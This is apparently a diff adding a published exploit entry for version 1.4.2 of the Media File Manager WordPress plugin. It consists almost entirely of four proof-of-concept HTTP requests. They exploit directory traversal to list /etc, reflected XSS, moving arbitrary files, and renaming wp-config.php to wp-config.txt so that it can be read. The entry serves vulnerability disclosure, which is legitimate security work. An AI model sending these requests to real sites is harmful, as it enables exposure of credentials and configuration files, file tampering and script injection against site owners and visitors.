@@ -1,0 +1,85 @@
+# Exploit Title: Wordpress Plugin Media File Manager 1.4.2 - Directory Traversal
+# Date: 2018-05-11
+# Exploit Author: Pasquale Turi (aka boombyte)
+# Vendor Homepage: https://wordpress.org/plugins/media-file-manager/
+# Software Link: https://wordpress.org/plugins/media-file-manager/
+# Version: 1.4.2
+# CVE: N/A
+# Tested on: Ubuntu 18.10
+
+# Plugin description:
+# This plugin can be used for manage the uploaded file (we can rename files, see a preview, 
+# delete and move them to other folders under wordpress upload 	folder).
+# This plugin can be used by administrator, author, contributor and subscriber.
+
+# POC
+# Diretory trasversal:
+
+POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: */*
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: REDATED
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 53
+Connection: close
+Cookie:	REDACTED
+
+action=mrelocator_getdir&dir=../../../../../../../etc
+
+# POC
+# XSS Reflected
+
+POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: */*
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/wordpress/wp-admin/upload.php?page=mrelocator-submenu-handle
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 68
+Connection: close
+Cookie: REDACTED
+
+action=mrelocator_getdir&dir=[XSS]
+
+# POC
+# Move any file to any dir:
+
+POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: */*
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/wordpress/wp-admin/upload.php?page=mrelocator-submenu-handle
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 75
+Connection: close
+Cookie: REDACTED
+
+action=mrelocator_move&dir_from=../../&dir_to=../../../&items=wp-config.php
+
+# POC
+# Rename any file:
+
+POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: */*
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/wordpress/wp-admin/upload.php?page=mrelocator-submenu-handle
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 97
+Connection: close
+Cookie:	REDACTED
+
+action=mrelocator_rename&dir=../../&from=wp-config.php&to=wp-config.txt
